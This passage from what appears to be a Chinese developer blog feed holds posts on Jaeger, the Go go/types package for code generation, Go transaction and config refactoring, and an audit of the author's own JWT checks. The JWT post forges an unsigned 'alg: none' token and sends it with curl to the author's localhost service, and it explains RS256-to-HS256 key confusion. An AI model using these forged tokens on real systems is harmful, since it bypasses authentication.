，但问起怎么怎么高可用，怎么做主备，怎么做读写分离，怎么分库分表，其实一个也不会（对，我也差不多）。\nk8s 也是个很大的坑，现在甚至有点感觉后端一路走下来真正坑人的都是这些大框架，大概念，比如前段时间流行过的中台，风口上的云计算、云原生，好像沾个云就牛逼起来了。我不是说 k8s 没用嗷，我是说媒体吹的时候个个都是银弹，老板吹的时候各个都是给我也整一个！\n还好压力最后都转化成了见鬼的需求和莫名其妙的技术选型，最底层的开发只要放弃思考就完事了，写什么代码不是写，大家都是给资本服务嘛。\n","date":"2022-04-12T13:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/jaeger-with-es-backend-exceeded-maximum-shards-open/","title":"记一次 jaeger es 后端出现 maximum shards open 错误排查"},{"content":"前言 本篇博客主要想介绍下 go/types 这个包。\n目前关于 go 代码生成比较常见的是利用 go/ast ，结合 text/template 生成代码。这种生成方式显然是有局限性的：go/ast 这个包只能拿到语法树结构，但没有类型信息。比如 var ctx context.Context 可以解析成语法树节点 ast.GenDecl，但context.Context 只能解析出 ast.SelectorExpr，并不知道 context.Context 是一个 struct、interface还是alias。\n在面对简单的代码生成时go/ast还能顶一下，但更复杂一点的需求，比如说根据 struct 生成 thrift 或者 protobuf 定义，go/ast 就有点吃力不讨好了。\n入门 注意这块没照搬官方的 example，因为官方的 example 主要注重在怎么用 go/types 做类型检查，关注 types.Config 和 types.Checker，但我不是很想管 checker 怎么样，我们的目的是写个 codegen，想办法拿到更丰富的类型信息。\n因此 go/types 的使用更关注的是其中的数据结构。\n类型系统 先来个基本的例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58  package main import ( \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;go/importer\u0026#34; \u0026#34;go/token\u0026#34; \u0026#34;go/types\u0026#34; \u0026#34;log\u0026#34; ) func main() { var pkgPath string var typ string flag.StringVar(\u0026amp;pkgPath, \u0026#34;package\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;package path\u0026#34;) flag.StringVar(\u0026amp;typ, \u0026#34;type\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;type name\u0026#34;) flag.Parse() if pkgPath == \u0026#34;\u0026#34; { println(\u0026#34;-package is required\u0026#34;) flag.Usage() return } if typ == \u0026#34;\u0026#34; { println(\u0026#34;-type is required\u0026#34;) flag.Usage() return } fst := token.NewFileSet() imp := importer.ForCompiler(fst, \u0026#34;source\u0026#34;, nil) pkg, err := imp.Import(pkgPath) if err != nil { log.Fatal(err) } typename := pkg.Scope().Lookup(typ) if typename == nil { log.Fatalf(\u0026#34;type %s not found\u0026#34;, typ) } if named, ok := typename.Type().(*types.Named); ok { switch named.Underlying().(type) { case *types.Basic: println(\u0026#34;primitive type\u0026#34;) case *types.Interface: println(\u0026#34;interface type\u0026#34;) case *types.Struct: println(\u0026#34;struct type\u0026#34;) default: if named.Obj().IsAlias() { println(\u0026#34;is alias type\u0026#34;) return } fmt.Printf(\u0026#34;%v\u0026#34;, named) } } }   很短，注意几个新出现的包和API：go/importer、go/types。\ngo/importer顾名思义是一个管理import功能的包，go 不是 python 这样解释执行或 Java 那样可以热加载代码的模型，importer基本是编译期才会用到。我们用importer.ForCompiler的目的是构造一个 Importer， 从源代码 拿到类型信息。\n从Import调用拿到一个 *types.Package 类型的返回值后，又使用 Scope().Lookup()从这个包作用域下查找指定的类型——这里提一嘴，type xxx struct{}这样的语句可以是块作用域的，Scope().Lookup()查找的是 包内的全局类型定义 ，查找结果是一个 types.Object，可以理解成一个有类型的对象——比如全局 var v int 这样声明的 v。对于查找的是类型的情况，需要关注的就是 .Type()这个方法了。\n顾名思义.Type()返回对象的类型，代码里的 type switch 应该很好地展示了整个过程。\n另外还要注意到 .(*types.Named)，这里涉及一个 named type概念。所谓的 Named 在 Go Specification 里是这样解释的：\n Predeclared types, defined types, and type parameters are called named types. An alias denotes a named type if the type given in the alias declaration is a named type.\n 什么意思呢？predeclared types 指的是内置的类型，如 int、byte、rune，参考链接 predeclares 。而 defined types 指的是形如 type Sample struct {} 的类型定义，type parameters 则是 go 1.18 引入的泛型语法，例如 type Sample[T any] struct {t T} ，其中的T也是 named type。\n那什么样的不是 named type呢？比如type Sample = struct {}，这里的 Sample 就不是 named type。注意前面引文的后半句：\n An alias denotes a named type if the type given in the alias declaration is a named type.\n 只有named type的别名才被视为named type，所以 type Sample = int 是 named type，但 type Sample = struct{} 或者 type Sample = map[string]string 都不是 named type。\n好了，绕晕了就可以继续下一阶段了，开始了解 Field 和 Method。\nField 我们稍微改一下上面的代码，在 case *types.Struct 下加入几行循环。记得 switch也改成switch tp := named.Underlying().(type)\n1 2 3 4  for i := 0; i \u0026lt; tp.NumFields(); i++ { field := tp.Field(i) fmt.Printf(\u0026#34;field %s %v\\n\u0026#34;, field.Name(), field.Type()) }   又一个惯用法：NumFields 和 Field。注意Field拿到的是一个 *types.Var，可以认为表示一个变量，而field.Type()得到的就是这个变量的类型。\n有了类型数据，我们就可以有的放矢，决定如何生成 field 对应的代码了。\nMethod 另一种常见的情况是基于 interface 生成实现，比如 go-kit 那海量的样板代码。\n我们稍微改下上面的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  for i := 0; i \u0026lt; tp.NumMethods(); i++ { method := tp.Method(i) signature := method.Type().(*types.Signature) fmt.Printf(\u0026#34;func (r Sample) %s(\u0026#34;, method.Name()) for i := 0; i \u0026lt; signature.Params().Len(); i++ { param := signature.Params().At(i) fmt.Printf(\u0026#34;%s %v,\u0026#34;, param.Name(), param.Type()) } fmt.Print(\u0026#34;)\u0026#34;) if signature.Results().Len() \u0026gt; 1 { fmt.Print(\u0026#34; (\u0026#34;) } for i := 0; i \u0026lt; signature.Results().Len(); i++ { result := signature.Results().At(i) fmt.Printf(\u0026#34;%s %v\u0026#34;, result.Name(), result.Type()) if i+1 \u0026lt; signature.Params().Len() { fmt.Print(\u0026#34;,\u0026#34;) } } if signature.Results().Len() \u0026gt; 1 { fmt.Print(\u0026#34; )\u0026#34;) } fmt.Print(\u0026#34; {\\n\\tpanic(errors.New(\\\u0026#34;Not implemented!\\\u0026#34;))\\n}\\n\\n\u0026#34;) }   并不复杂！\n遍历 interface 下的所有方法，然后把 Params 和 Results 挨个打印出来，函数体里放一个 panic(errors.New(\u0026quot;Not implemented!\u0026quot;))，就是这样！\n最后输出像是这样：\n1 2 3 4 5 6 7  func (r Sample) FirstName() string { panic(errors.New(\u0026#34;Not implemented!\u0026#34;)) } func (r Sample) LastName() string { panic(errors.New(\u0026#34;Not implemented!\u0026#34;)) }   值得注意的是，Method返回的是 *types.Func，但 Params和Results并不是types.Func上的方法，而是 types.Signature。官方文档说 Func的Type()返回的必然是 *types.Signature，所以直接断言也是安全的。\n总结 参考官方的文档 gotypes\n重点就一个：不要用 go/types 下的 Config 和 Checker，用 importer.ForCompiler 从源码获取类型数据。types用起来个人感觉比 go/ast 方便，缺点是因为引入类型会导致解析源码各方面的消耗增加，算是一个我个人比较偏好的 trade-off 吧。在 codegen 的输入类型比较复杂敏感的时候，拿 go/types 替代 go/ast 可以省下很多工作量。\n","date":"2022-04-11T13:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/gotypes-for-codegen/","title":"codegen 利器 go/types"},{"content":"前言 今早翻到p神挖MinIO CVE的文章，注意到几句话：\n jwt常见的攻击方法主要有下面这几种：\n 将alg设置为None，告诉服务器不进行签名校验 如果alg为RSA，可以尝试修改为HS256，即告诉服务器使用公钥进行签名的校验 爆破签名密钥   虽然早早在项目里用上了jwt（大概是16~17年，在另一家公司的登陆系统里），但在目前任职的公司用上jwt的时候还真没从安全的角度考虑过如何编写 正确、安全 的 jwt 验证代码。悄悄哔哔一句我也不是搞安全的啊（\n既然翻博客的时候看到了，就没法当没看见。正好翻翻看自己写的垃圾代码是不是有洞。\n开始 review 因为这项目后端是微服务架构，身份验证实际上分成了两种情况：\n 提供验证的服务，从 redis/mysql 校验身份 其他服务，通过 rpc 请求验证服务来校验身份  jwt 本身通过签名机制保证发放出来的 token 不被篡改，所以在最初编写的时候主要考虑的还是解决用户账户的封禁、登陆互斥问题，jwt 对解决这方面问题的帮助有限，就没怎么深究。\n验证流程很简单：\nincoming request -\u0026gt; gRPC interceptor (rpc_authneticate()) -\u0026gt; auth.Authenticate(ctx, req)\nauth.Authenticate 是验证业务的实现，分几个步骤：\n 解析输入token，func ParseToken(token string) (*jwt.Token, *CustomJWTClaims, error) 同平台登陆互斥，限制同一平台仅一个有效登陆。通过比较 redis 里保存的 token 实现。 账户状态检查，因为缓存设计的问题导致这一步需要查数据库，实现稀烂。  p神博客原文提到的方法里，修改 ALG 来跳过校验无疑是最可能出现的坑，然后我就看了下自己写的：\n1 2 3 4 5 6 7 8 9 10  // ParseToken 解析 jwt token，返回 token,claims,error func ParseToken(token string) (*jwt.Token, *CustomJWTClaims, error) { claims := \u0026amp;CustomJWTClaims{} t, err := jwt.ParseWithClaims(token, claims, func(t *jwt.Token) (interface{}, error) { return JWTSecret, nil }) if err != nil { return nil, nil, errors.Wrap(err, \u0026#34;parse jwt token with claims fail\u0026#34;) } return t, claims, nil }   \u0026hellip;\n好，我寄了！\n验证漏洞 事到如今已经没有退路，洞肯定是要补的，补之前出于好奇，再尝试一次利用，也作为洞存在的验证。\nALG none jwt 产生的签名字符串分成3个部分：HEADER、PAYLOAD、SIGNATURE，均使用 base64 编码，用 . 分隔。以官网的例子来分析如下：\n其中 header 和 payload 部分会编码成 url 安全的 base64，可以在命令行 echo \u0026lt;jwt.header\u0026gt; | base64 -d 来看到 header 实际包含的内容，payload 同理。signature 的算法由 header 里的 alg 指定，比如 alg 是 HS256 的时候签名就是 HMACSHA256(base64(header)+\u0026quot;.\u0026quot;+base64(payload))。\n攻击方式1里提到的把 ALG 改成 none，就是告诉服务器不做签名验证，如果服务器信了你的邪，那就可以伪造出任意身份。\n接下来尝试构造一个无签名的 jwt 请求：\n1 2 3 4 5  echo \u0026#39;{\u0026#34;alg\u0026#34;: \u0026#34;none\u0026#34;, \u0026#34;typ\u0026#34;:\u0026#34;JWT\u0026#34;}\u0026#39; | base64 # eyJhbGciOiAibm9uZSIsICJ0eXAiOiJKV1QifQo= echo \u0026#39;{\u0026#34;iat\u0026#34;: 1649645013, \u0026#34;user_id\u0026#34;: 1, \u0026#34;device_category\u0026#34;: 0, \u0026#34;device_code\u0026#34;: \u0026#34;233\u0026#34;, \u0026#34;landing_platform\u0026#34;:\u0026#34;PC\u0026#34;}\u0026#39; | base64 # eyJpYXQiOiAxNjQ5NjQ1MDEzLCAidXNlcl9pZCI6IDEsICJkZXZpY2VfY2F0ZWdvcnkiOiAwLCAi # ZGV2aWNlX2NvZGUiOiAiMjMzIiwgImxhbmRpbmdfcGxhdGZvcm0iOiJQQyJ9Cg==   需要注意的是=是 base64 编码中的占位符，在构造签名字符串的时候要去掉。\n最后用.连接，校验合法性。\n1  eyJhbGciOiAibm9uZSIsICJ0eXAiOiJKV1QifQo.eyJpYXQiOiAxNjQ5NjQ1MDEzLCAidXNlcl9pZCI6IDEsICJkZXZpY2VfY2F0ZWdvcnkiOiAwLCAiZGV2aWNlX2NvZGUiOiAiMjMzIiwgImxhbmRpbmdfcGxhdGZvcm0iOiJQQyJ9Cg.   \u0026hellip; 得，直接试一下。\n1  curl -v -X GET -H \u0026#39;grpc-metadata-sessionkey: eyJhbGciOiAibm9uZSIsICJ0eXAiOiJKV1QifQo.eyJpYXQiOiAxNjQ5NjQ1MDEzLCAidXNlcl9pZCI6IDEsICJkZXZpY2VfY2F0ZWdvcnkiOiAwLCAiZGV2aWNlX2NvZGUiOiAiMjMzIiwgImxhbmRpbmdfcGxhdGZvcm0iOiJQQyJ9Cg.\u0026#39; \u0026#34;localhost/v4/user/get_userinfo\u0026#34;   惊喜！\n看了眼使用的 jwt 库，github.com/dgrijalva/jwt-go v3.2.0+incompatible，目前迁移到了 github.com/golang-jwt/jwt，最新版本 4.x ，感谢这库给我挡了一枪。\nALG RS256 另一个坑，HS256 =\u0026gt; RS256 攻击，倒是没踩上。\n1 2 3  token := jwt.NewWithClaims(jwt.SigningMethodHS256, \u0026amp;CustomJWTClaims{ // ... })   HS256 攻击没有 ALG none 攻击那么简单直白了，特地去搜了下 HS256 攻击方法和原理。\n参考文章：\n Attacks on JSON Web Token Get a Feel of JWT (JSON Web Token)  RS256签名的算法可以这样表示：base64(rsa256(sha256(base64(header)+\u0026quot;.\u0026quot;+base64(payload)+secret)))，其中需要关注的是 rsa256 是如何签名的。\n关于不对称加密套件的加解密/签名一句话概括就是：公钥加密，私约解密；私钥签名，公钥验签。RS256=\u0026gt;HS256攻击的原理就是服务器验证签名的时使用的是公钥——顾名思义，“公”指的是公开的，如果服务器所使用的的秘钥对在其他地方复用（比如使用的是域名的公钥），那公钥就唾手可得。\n仅仅拿到了公钥还不够，因为签名只能由私钥产生。这里就涉及一个 JWT 实现的漏洞：\n CVE-2015-9235 CVE-2016-10555  服务端使假设签名是 RS256 ，用公钥验签时，客户端可以构造一个恶意的 jwt 签名，把HEADER里的 ALG 指定为 HS256，服务端就会把 RS256 验证的公钥当成 HS256 的私钥来验证签名。\n满足下面三个条件：\n 服务器签发、接受 RS256 私钥签名的JWT 拿到公钥 使用有漏洞的 jwt 库  就能自由构造任意 JWT PAYLOAD。\n暴力穷举 既 brute-force 大法，对弱密码加上好点的字典也是可行的。不过我这服务HS256 秘钥是随机生成的，大小写字母+特殊字符。\n不过即使是这样还是有考虑定期轮换秘钥，验证的阶段根据 iat/exp 来选择秘钥，即使攻击者舍得花时间碰运气也很难瞎猫碰上死耗子了。但因为种种原因，多少感觉有点过度设计的意思吧。就暂且没管。\n修复 已知 jwt 库已经解决了 ALG none 的问题，采用的签名算法也不是 RS256，随机秘钥熵也够，那就没啥可修复的了。非要说的话可以在 ParseToken 阶段限制下 ALG 的选择，强制选择一个比较坚挺的哈希算法。再把秘钥轮换做起来。\n可以先列入计划，优先级不用太高吧。\n总结 显然没有银弹这句话很对，jwt 并不是解决一切问题的良药，甚至是一把可能砸在自己小拇指上的锤子。\n对 jwt 的三种常规攻击方式，两种是操纵 header 的 alg 实现的，alg none 的方式尝试跳过签名验证，alg rs256 转 hs256 则是利用库漏洞加上窃取公钥来伪造签名，利用难度更大。\n暴力穷举法就没什么可说的了，或许在代码审计的时候需要考虑下秘钥面对暴力穷举时的安全性。\n","date":"2022-04-11T13:00:00+08:00","permalink":"https://nnnewb.github.io/blog/p/unsafe-jwt/","title":"不安全的 jwt"},{"content":"前言 重构发生的背景是这样的。\n我手里的项目因为一系列管理上的混乱和不作为导致接手的时候非常糟，总之理解成那种写了一两年代码第一次接触Go没人review代码的半吊子还从单体beego一路跨到非常考验架构能力到编程能力各方面能力的微服务架构结果留下烂摊子跑路了的情况就对啦。\n没看懂写的什么鬼？对，我接手项目的时候也是这个感觉。\n细看也能读懂，业务逻辑不复杂，但读起来的感觉就像是shit里淘金。\n其中有几个特别困扰我的问题：\n 事务管理凌乱，混用 xorm 和database/sql，各种拼 sql 和手动管理 sql.Tx，分布式事务的问题零关注。 配置极其杂乱，几百条配置项不分用途场景全写成环境变量，结果就是海量的全局变量和极乱的 func init。  还有些和主题无关的问题，比如完全没有考虑缓存，现在在屎山上建缓存就非常头疼了；API 设计完全没考虑如何演进，不说 BFF 什么的设计模式，这 API 就完全是毫无设计，到处滥用 protobuf 生成的结构，结果严重耦合，等等种种。这些这里先不提。\n对于事务管理和配置管理的问题可以再细细分析。\n事务管理重构 痛点 先看一段重构前的事务代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  tx, err := DB.Begin() if err != nil { return nil, err } rollBack := true defer func() { if rollBack { err := tx.Rollback() if nil != err { log.Error(\u0026#34;rollback failed\u0026#34;) } } }() // ...  rollBack = false if err := tx.Commit(); err != nil { return nil, err }   还有第二种写法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  var ( sqlStmts = make([]string, 0, len(req.UserId)) params = make([][]interface{}, 0, len(req.UserId)) ) // for ... { // ... // sqlStmts = append(sqlStmts, \u0026#34;update task_answer set is_eva=?,is_excellent=?,eva_text=?,eva_expression=? where task_id=? and user_id=?\u0026#34;) // params = append(params, []interface{}{constants.True, req.IsExcellent, req.TaskEva.Text, req.TaskEva.Expression, req.TaskId, v}) // }  if err := DB.ExecSqlInTxAndCommit(ctx, sqlStmts, params); err != nil { return nil, err }   事务管理上最大的痛点有几个：\n 手工Commit/Rollback逻辑较复杂，需要辅助变量或命名返回值，还要处理 recover。 手工Commit/Rollback样板代码多。 已有的事务封装效果不佳，拼凑 sqlStmts []string 有损可读性，写起来也麻烦。 由于上面的原因，很大部分的 CURD 接口都没有事务化处理，存在隐患。 显而易见，分布式事务完全没有考虑过。  目标 重构的时间成本是很高的，因为重构花的精力不能直接变现成业务价值，对不做编码和架构工作的管理层来说虚无缥缈的“可维护”、“灵活”、“隐患”这样的说辞并不容易被认可。\n一般来说，主动提重构要时间（要不到），提方案（大刀阔斧被否），执行（同事觉得你多管闲事），review（长不看），最后背锅（线上crash怎么想都是你的错啦！），这一路闯关下来可不容易。但是\u0026hellip;我司管理混乱，我比较闲。\n所以能大方地掏出时间搞个没什么业务价值的重构，看看能不能消灭一些隐患，也方便将来我或者下一个接盘侠需要二次开发的时候少吃点苦头。\n重构的目标是解决上面的痛点1234，但分布式事务不太好即刻引入。原因也简单，要考虑下用什么框架，coordinator 选型，和现有的事务管理体系对接，做线上升级方案，这一系列事情最好等事务管理统一后再做，才可能事半功倍。\n调研 古人云：\n 它山之石可以攻玉。\n 所以先看看别的知名框架怎么处理的事务是个好主意。\nbeego beego有两种事务管理方法，第一种是利用闭包：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  // Beego will manage the transaction\u0026#39;s lifecycle // if the @param task return error, the transaction will be rollback // or the transaction will be committed err := o.DoTx(func(ctx context.Context, txOrm orm.TxOrmer) error { // data \tuser := new(User) user.Name = \u0026#34;test_transaction\u0026#34; // insert data \t// Using txOrm to execute SQL \t_, e := txOrm.Insert(user) // if e != nil the transaction will be rollback \t// or it will be committed \treturn e })   具体实现是很好猜的，DoTx里defer func(){}()处理下返回值和recover，没有错误就提交。这种写法很灵活，也能有效避免忘记defer或者defer考虑不够全面之类的问题。\nbeego的另一种事务管理方法就是手动Commit/Rollback了，和直接用 sql.Tx 差别不大，不细说了。\ngin gin没有官方的事务方案，不过我找到一个社区方案：利用中间件在 context 里注入事务对象，业务代码里可以 GetTransactionFromContext(ctx) 获取，后续处理没有错误就提交，和 beego 的闭包法类似，不过就是把事务从业务代码提到了全局，进一步减少了侵入。\ndjango django 是 python 的 web 框架，也有一定参考意义。\ndjango的事务主要是靠装饰器实现的：\n1 2 3 4 5 6  from django.db import transaction @transaction.atomic def viewfunc(request): # This code executes inside a transaction. do_stuff()   也可以用上下文管理器：\n1 2 3 4 5 6 7 8 9  from django.db import transaction def viewfunc(request): # This code executes in autocommit mode (Django\u0026#39;s default). do_stuff() with transaction.atomic(): # This code executes inside a transaction. do_more_stuff()   关于Python的装饰器和上下文管理器，我简要解释下：\n装饰器：高阶函数，接受被装饰函数作为输入，返回新函数。比如\n1 2 3 4 5 6 7 8  def decorator(f): def wrapped(*args,**kwargs): return f(*args,**kwargs) return wrapped @decorator def fun(): pass   本质上就是\n1 2 3 4 5 6 7 8 9  def decorator(f): def wrapped(*args,**kwargs): return f(*args,**kwargs) return wrapped def fun(): pass fun = decorator(fun)   至于上下文管理器，可以简单理解成 try {} finally {}。\ndjango的思路和beego、gin是很相似的，因为python的装饰器语法存在使得事务管理可以更灵活地在函数级作用域里使用，而不用侵入业务代码。\nspringboot springboot主要利用注解和一系列我也不懂的JVM机制添加事务，具体还是不说了，多说多错。随手搜的一篇参考文章：Springboot之@Transactional事务注解原理详解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  public Object invoke(MethodInvocation invocation) throws Throwable { Class\u0026lt;?\u0026gt; targetClass = invocation.getThis() != null ? AopUtils.getTargetClass(invocation.getThis()) : null; Method var10001 = invocation.getMethod(); invocation.getClass(); // 调用事务逻辑  return this.invokeWithinTransaction(var10001, targetClass, invocation::proceed); } @Nullable protected Object invokeWithinTransaction(Method method, @Nullable Class\u0026lt;?\u0026gt; targetClass, TransactionAspectSupport.InvocationCallback invocation) throws Throwable { TransactionAttributeSource tas = this.getTransactionAttributeSource(); // 获取改方法上的事务配置，包括传播级别、异常信息等配置  TransactionAttribute txAttr = tas != null ? tas.getTransactionAttribute(method, targetClass) : null; // 事务管理器，负责生成事务上下文信息，比如开启事务、获取数据库链接等逻辑  TransactionManager tm = this.determineTransactionManager(txAttr); ... PlatformTransactionManager ptm = this.asPlatformTransactionManager(tm); String joinpointIdentification = this.methodIdentification(method, targetClass, txAttr); // 根据传播级别配置，看是否需要新建事务  TransactionAspectSupport.TransactionInfo txInfo = this.createTransactionIfNecessary(ptm, txAttr, joinpointIdentification); Object retVal; // 通过try catch捕获异常来实现回滚逻辑  try { // 调用真正的dao层逻辑  retVal = invocation.proceedWithInvocation(); } catch (Throwable var18) { // 根据@Transactional配置的异常来决定是否回滚  this.completeTransactionAfterThrowing(txInfo, var18); throw var18; } finally { // 结束当前的事务，信息是保存在ThreadLocal里  this.cleanupTransactionInfo(txInfo); } if (retVal != null \u0026amp;\u0026amp; vavrPresent \u0026amp;\u0026amp; TransactionAspectSupport.VavrDelegate.isVavrTry(retVal)) { TransactionStatus status = txInfo.getTransactionStatus(); if (status != null \u0026amp;\u0026amp; txAttr != null) { retVal = TransactionAspectSupport.VavrDelegate.evaluateTryFailure(retVal, txAttr, status); } } // 没有异常时，执行commit操作  this.commitTransactionAfterReturning(txInfo); return retVal; ... }   可以看到排除 springboot 的机制外，思路依然是清晰易懂的：进入业务逻辑前准备好事务，业务逻辑后没有错误则提交，否则回滚。\n上述4种框架的处理方法都是在使用各种语言机制来应用 AOP 思想。\n方案 考虑到旧代码范围广，闭包模式需要对旧的用法做侵入式修改，工作量大；针对特定业务函数应用装饰器模式在go语言环境下水土不服；唯一可能的选择就是中间件了。\n而中间件又有几个选择：\n 针对服务接口封装中间件，优点是可以实现接口级按需注入事务，缺点是写起来啰嗦 全局中间件，优点是实现简单，缺点是所有业务接口都会注入事务  更进一步的抽象，比如 gokit 架构设计中的对单个业务接口抽出 Endpoint ，彻底把业务层和传输层分离，所需的工作量更是离谱。\n最终出于review友好也对我的手指友好考虑，还是选择全局中间件，但加改变，同时注入sql.DB，并且让事务懒启动，尽量避免多余的Begin/Commit/Rollback拖长接口耗时。\n这一方案落地为一个txmanager包和一个 gRPC Interceptor ，txmanager 定义数据库接口、事务接口，以及注册事务等工具函数；Interceptor 在context注入数据库和事务，在业务执行完成后，defer里 recover并检查返回值，决定提交或回滚。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  defer func() { txSet, ok := ctx.Value(txSetKey).(mapset.Set) if !ok { return } defer txSet.Clear() if e := recover(); e != nil { // 检查 panic  rollbackTxSet(ctx, txSet) panic(e) } else if err != nil { // 检查 error 返回值  log.ErrorC(ctx, \u0026#34;rollback due to error\u0026#34;, \u0026#34;err\u0026#34;, err, \u0026#34;recovered\u0026#34;, e) rollbackTxSet(ctx, txSet) } else if resp != nil \u0026amp;\u0026amp; reflect.Indirect(reflect.ValueOf(resp)).FieldByName(\u0026#34;Code\u0026#34;).Int() != errorcode.RequestSuccess { // 检查响应 Code  log.ErrorC(ctx, \u0026#34;rollback due to response code\u0026#34;, \u0026#34;code\u0026#34;, reflect.Indirect(reflect.ValueOf(resp)).FieldByName(\u0026#34;Code\u0026#34;).Int()) rollbackTxSet(ctx, txSet) } else { // 没有错误，提交事务  commitTxSet(ctx, txSet) return } }()   考虑到旧的代码并不规范，所以一个 ctx 是可以可以注入多个数据库和事务的，把事务绑定到上下文的工作只能在微服务代码下再单独写两个工具函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  func GetBaseDB(ctx context.Context) *sql.DB { v := ctx.Value(BaseDBKey) if v == nil { panic(errors.New(\u0026#34;no database found in context\u0026#34;)) } if db, ok := v.(*txmanager.WrappedDB); ok { return db.DB } panic(fmt.Errorf(\u0026#34;unexpected database type %T\u0026#34;, v)) } func GetTxForBaseDB(ctx context.Context) *sql.Tx { tx, err := txmanager.LazyBeginTx(ctx, BaseDBKey, BaseTxKey) if err != nil { panic(errors.Wrap(err, \u0026#34;get transaction for base db failed\u0026#34;)) } return tx.(*sql.Tx) }   如此一来，在业务代码里，原本的 DB.Query只要改成GetBaseDB(ctx).Query即可，影响降至最低。\n而原本涉及事务的代码，也可以简单地改写成：\n1 2 3 4  tx := GetTxForBaseDB(ctx) // ...业务代码 // tx.ExecContext(ctx, query, args...)   原本复杂的defer就可以直接省略了，sqlStmts也可以去除，变成 tx.ExecContext() ，读起来更清楚。\n效果评估 最明显的就是原本考虑不周的 defer 里 Commit/Rollback 被考虑更全面的中间件替代了，潜在的 panic导致错误提交/回滚问题得到修正，相关代码去除后可读性有所改善。\n其次是有机会在这个基础上统一封装一个分布式事务，把侵入业务代码的可能降到比较低的水平。\n重构完还发现，利用数据库初始化从init推迟到main的改变，有机会对数据库做mock，可测试性也有改善。\n也看了下 jaeger 对请求耗时的分析，重构后的事务管理器增加的耗时不明显，不够成瓶颈，性能上也马马虎虎过得去。压测因为压力直接打到MySQL的原因没法做，QPS瓶颈很明显卡在数据库上，缺少缓存依然是致命短板。\n配置管理重构 痛点 相信很多人写代码的时候习惯把第三方的服务的 key/secret 直接写成常量，然后用一个宏或者标志去控制用哪套配置，比如这样：\n1 2 3 4 5 6 7 8 9 10  #ifdef PRODUCTION #\tdefine QINIU_AK \u0026#34;***ak***\u0026#34; #\tdefine QINIU_SK \u0026#34;***SK***\u0026#34; #elif defined(TESTING) #\tdefine QINIU_AK \u0026#34;***ak***\u0026#34; #\tdefine QINIU_SK \u0026#34;***SK***\u0026#34; #else #\tdefine QINIU_AK \u0026#34;***ak***\u0026#34; #\tdefine QINIU_SK \u0026#34;***SK***\u0026#34; #endif   但这项目比较狗，选择用环境变量来配置。用环境变量也就算了，最大的问题是：不管什么东西都往环境变量里塞，所有微服务共用一套环境变量配置，结果环境变量配置足有一百多行，也不管谁在用，怎么用。\n这也就罢了\u0026hellip;\n更离谱的是，连推送文案，居然也写到环境变量里\u0026hellip;我寻思这玩意儿不得让运营人员编辑的吗\u0026hellip;\n在上一份工作里维护的项目就好得多，大部分配置放到了 etcd，比如第三方服务的ak/sk和一些业务配置，也做到了热重载，不需要开发/运维人员介入就能实时调很多东西。而现在的项目，属于是开发的时间不要钱，宁可随时 on call 也不安排写个配置编辑和热重载。\n而且还有个比较头疼的问题是，因为配置是环境变量，环境变量又由 kubernetes configmap 管理，kubernetes 配置又和源代码一起被 git 跟踪管理，所以即使是运营人员想改个推送文案，也要走开发的 hotpatch 流程，提交到 git 上，谁都不舒服。\n最终列出痛点如下：\n 配置修改不便。 不支持按需访问，存在误用滥用。 从痛点2延伸出不可控问题，无关配置项配置问题也会导致服务初始化时 crash，倒逼所有服务共用一套环境变量。 从痛点1延伸出不灵活问题，即使有修改不便的问题，也不支持更换配置源，存在强耦合。  调研 因为配置管理其实是一个和语言关系比较大的领域，配置读写的接口灵不灵活好不好用很大程度看语言有哪些奈斯的语法糖。\n比如 python 可以继承 UserDict 等结构实现个同时支持.语法和下标的配置对象，更高阶的还可以用 descriptor 预先定义字段，检查/转换类型等等。\n再比如 C++ 就完全可以一套 template 打天下，接口完全可以设计成 get\u0026lt;int\u0026gt;、get\u0026lt;std::string\u0026gt; 这样，也可以利用运算符重载实现 config[\u0026quot;http.port\u0026quot;] 下标形式的访问，甚至再骚一点，结合一点宏和元编程，config-\u0026gt;http-\u0026gt;port 也行。\n对 Go 这样的语言来说事情会更麻烦，一来是静态类型，堵死了一个Get覆盖所有情况的路子。除非不介意 interface{} 满天飞。二来泛型不成熟，同样堵死了像 C++ 那样一个 Get[T] 打天下的路子。\n所以调研主要还是考虑有没有现成的轮子，能不能满足需要。\nviper viper 是一个相当流行的配置管理库，原本是为 cobra （一个 cli 库）设计的。\nviper 支持不少配置源，从配置文件（JSON、TOML、YAML、INI）到环境变量、远程配置（etcd、consul）都能支持，接口设计上也还算舒服（像是viper.GetString(key)这样的用法），而且有个比较奈斯的热重载。缺憾是etcd暂时只支持到 v2，而且支持多种配置的方式是嵌入本体，导致 viper 仓库依赖很多。\n考虑到 viper 对付目前的需求有点 overkill，而且依赖有点偏多，决定是定义一套读配置接口，先自行实现基于环境变量的配置提供者，若有需要再把读配置接口的实现替换成 viper 。\n方案 鉴于当前项目中配置项是全局变量+func init，替换成配置管理器解决修改不便+热重载的话需要把全局变量换成 sync.Map 或者 GetXxx() 。考虑到是读多写少的场景，sync.Map 有点过，而且把全局变量替换成 config[\u0026quot;Xxx\u0026quot;] 还会遇到类型问题。\n而GetString这种形式的接口，又需要把配置名换成字符串，直接用环境变量当 key 的话又会碰到环境变量命名不好、其他配置源命名规则有区别等情况。从使用的角度来说，还是希望尽可能把对业务代码的影响降到最低，因此业务代码里最好还是 GetQiniuAK() string 这样的接口最合适，内部实现可以是适配到 GetString(\u0026quot;QINIU_AK\u0026quot;)。\n同样有部分痛点无法立即得到解决：\n 